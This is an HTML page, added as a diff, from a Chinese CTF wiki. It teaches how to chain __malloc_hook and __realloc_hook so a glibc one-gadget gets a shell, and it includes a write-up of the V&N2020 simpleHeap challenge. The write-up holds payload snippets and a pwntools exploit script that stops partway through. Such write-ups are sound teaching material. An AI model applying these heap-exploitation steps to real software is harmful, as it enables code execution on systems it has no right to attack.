@@ -1,0 +1,811 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/glibc-heap/realloc/">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>通过 realloc_hook 调整栈帧使 onegadget 生效 - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#realloc_hook-onegadget" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              通过 realloc_hook 调整栈帧使 onegadget 生效
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" >
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
+    
+    <label class="md-nav__link" for="nav-1-1">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      格式化字符串漏洞基础利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#realloc" class="md-nav__link">
+    了解 realloc
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#malloc_hook-realloc_hook" class="md-nav__link">
+    malloc_hook 与 realloc_hook 配合
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    例题
+  </a>
+  
+    <nav class="md-nav" aria-label="例题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vn2020-simpleheap" class="md-nav__link">
+    [V&amp;N2020 公开赛]simpleHeap
+  </a>
+  
+    <nav class="md-nav" aria-label="[V&amp;N2020 公开赛]simpleHeap">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#roarctf_2019_easy_pwn" class="md-nav__link">
+    roarctf_2019_easy_pwn
+  </a>
+  
+    <nav class="md-nav" aria-label="roarctf_2019_easy_pwn">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/glibc-heap/realloc.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="realloc_hook-onegadget">通过 realloc_hook 调整栈帧使 onegadget 生效<a class="headerlink" href="#realloc_hook-onegadget" title="Permanent link">&para;</a></h1>
+<p>在某些堆的题目当中，由于限制只能使用 house of spirit 等方法劫持 malloc_hook ，这种情况一般是往 malloc_hook 写入 onegadget ，再次申请堆来 getshell 。</p>
+<p>由于栈帧情况不满足，查询到的所有 onegadget 可能都打不通，这时就可以考虑下用 malloc_hook 和 realloc_hook 结合。先通过 realloc 调整栈帧，然后在运行 onegadget 。</p>
+<h2 id="realloc">了解 realloc<a class="headerlink" href="#realloc" title="Permanent link">&para;</a></h2>
+<p>realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook 函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的）。</p>
+<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">realloc</span><span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="err">……</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">_realloc_hook</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">_realloc_hook</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">retaddr</span><span class="p">);</span>
+    <span class="err">……</span>
+</code></pre></div>
+<p>看看 realloc 的汇编代码：（可以把 libc 拖到 ida 中看，也可以泄露地址后 gdb 调试查看 <code>x /20i [addr]</code>）</p>
+<div class="highlight"><pre><span></span><code>.text:00000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑o
+.text:00000000000846C0 ; __unwind {
+.text:00000000000846C0                 push    r15             ; Alternative name is &#39;__libc_realloc&#39;
+.text:00000000000846C2                 push    r14
+.text:00000000000846C4                 push    r13
+.text:00000000000846C6                 push    r12
+.text:00000000000846C8                 mov     r13, rsi
+.text:00000000000846CB                 push    rbp
+.text:00000000000846CC                 push    rbx
+.text:00000000000846CD                 mov     rbx, rdi
+.text:00000000000846D0                 sub     rsp, 38h
+.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr
+.text:00000000000846DB                 mov     rax, [rax]
+.text:00000000000846DE                 test    rax, rax
+.text:00000000000846E1                 jnz     loc_848E8        ; 跳转执行 realloc_hook
+.text:00000000000846E7                 test    rsi, rsi
+.text:00000000000846EA                 jnz     short loc_846F5
+.text:00000000000846EC                 test    rdi, rdi
+.text:00000000000846EF                 jnz     loc_84960
+</code></pre></div>
+<p>函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp 的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。除了可以控制 push 数量，还能通过偏移得到其他的 <code>push xxx</code> 。</p>
+<h2 id="malloc_hook-realloc_hook">malloc_hook 与 realloc_hook 配合<a class="headerlink" href="#malloc_hook-realloc_hook" title="Permanent link">&para;</a></h2>
+<p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</p>
+<div class="highlight"><pre><span></span><code>malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget
+</code></pre></div>
+<p>这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。</p>
+<p>realloc 这个偏移做题还是逐个试感觉快一点，因为设想是**少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code>** ，但实际上有少部分位置可能被其他东西写入改变了原来的值。自行调试体会一下：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 6个push</span>
+pwndbg&gt; x /20gx <span class="nv">$rsp</span>
+0x7fffffffdcb8: 0x00007ffff7a9195f  0x00007fffffffdd20
+0x7fffffffdcc8: 0x00005555555548e0  0x00007fffffffde40
+0x7fffffffdcd8: 0x0000000000000000  0x0000000000000000
+0x7fffffffdce8: 0x00007ffff7a43ea0  0x00007fffffffde40
+0x7fffffffdcf8: 0x0000000000000000  0x00007fffffffdd40
+0x7fffffffdd08: 0x00005555555548e0  0x00007fffffffde40
+0x7fffffffdd18: 0x0000000000000000  0x0000000000000000
+0x7fffffffdd28: 0x0000555555554b71  0x00005555555548e0
+0x7fffffffdd38: 0x0000001000000006  0x00007fffffffdd60
+0x7fffffffdd48: 0x0000555555554f86  0x00007fffffffde40
+
+<span class="c1"># 5个push</span>
+pwndbg&gt; x /20gx <span class="nv">$rsp</span>
+0x7fffffffdcc0: 0x00007ffff7a9195f  0x00005555555548e0
+0x7fffffffdcd0: 0x00007fffffffde40  0x0000000000000000
+0x7fffffffdce0: 0x0000000000000000  0x00007ffff7a43ea0
+0x7fffffffdcf0: 0x00007fffffffde40  0x0000555555554a23
+0x7fffffffdd00: 0x0000000000000000  0x00007fffffffdd40
+0x7fffffffdd10: 0x00005555555548e0  0x00007fffffffde40
+0x7fffffffdd20: 0x0000000000000000  0x0000555555554b71
+0x7fffffffdd30: 0x00005555555548e0  0x0000001000000006
+0x7fffffffdd40: 0x00007fffffffdd60  0x0000555555554f86
+0x7fffffffdd50: 0x00007fffffffde40  0x0000000100000000
+</code></pre></div>
+<p>原理上是：<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code></strong>，但实际部分位置的值会变，所以逐个试，速度可能比计算快。</p>
+<h2 id="_1">例题<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="vn2020-simpleheap">[V&amp;N2020 公开赛]simpleHeap<a class="headerlink" href="#vn2020-simpleheap" title="Permanent link">&para;</a></h3>
+<h4 id="_2">基本功能<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<p>一个基本的堆管理器，有增删查改功能。各项功能都是基于下标序号定位操作，上限为10个堆，大小为大于 0 、小于等于 0x6f 。没有结构体，基于两个列表存储堆信息。</p>
+<h4 id="_3">漏洞<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
+<p>在修改函数里，调用函数 sub_C39 完成对堆信息的修改。传入的参数如下：</p>
+<div class="highlight"><pre><span></span><code><span class="n">sub_C39</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">chunk_ptr_list</span><span class="p">[</span><span class="n">v1</span><span class="p">],</span> <span class="n">chunk_size_list</span><span class="p">[</span><span class="n">v1</span><span class="p">])</span>
+</code></pre></div>
+<p>在处理边界问题时，错误使用判断条件，导致溢出 1 字节，正确应该<code>if(i&gt;=size)</code>，具体逻辑如下：</p>
+<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">sub_C39</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">ptr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="n">size</span> <span class="p">)</span>                             <span class="c1">// off by one</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">ptr</span><span class="p">),</span> <span class="mi">1uLL</span><span class="p">)</span> <span class="p">)</span>    <span class="c1">// 输出错误的异常处理</span>
+      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">ptr</span><span class="p">)</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">ptr</span><span class="p">;</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<h4 id="_4">思路<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p>
+<p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p>
+<p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p>
+<hr />
+<p>溢出修改 chunk size 造成 chunk extend ，chunk0 用于溢出 chunk1 ，chunk2 用于读取 unsorted bin fd 指针，chunk3 防止 fake chunk 与 topchunk 合并。溢出 size 是经过计算符合 house of spirit 要求：</p>
+<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">&#39;k&#39;</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">)</span><span class="c1">#2</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xc1</span><span class="s1">&#39;</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="s1">&#39;yyds&#39;</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</code></pre></div>
+<p>泄露 libc 地址后，将 bin 中剩余内存申请出来，该指针与 chunk2 指向相同地址，任选其一释放，再用另外一个修改 fastbin fd 指针：</p>
+<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;skye&#39;</span><span class="p">)</span><span class="c1">#4</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mi">27</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+<p>正常来说将 malloc_hook 劫持为 onegadget 即可，但是测试发现这条题目的栈环境不满足全部 onegadget 条件，这就需要调整阵结构，使 onegadget 生效。<strong>需要配合使用 realloc_hook 和 malloc_hook。</strong></p>
+<p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 。然后通过多次尝试确定偏移为 12 。</p>
+<h4 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./vn_pwn_simpleHeap&quot;</span><span class="p">)</span>
+<span class="c1"># p = remote(&quot;node3.buuoj.cn&quot;,29864)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./vn_pwn_simpleHeap&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
+<span class="c1"># libc = ELF(&quot;./libc-2.23.so&quot;)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;choice: &quot;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;choice: &quot;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
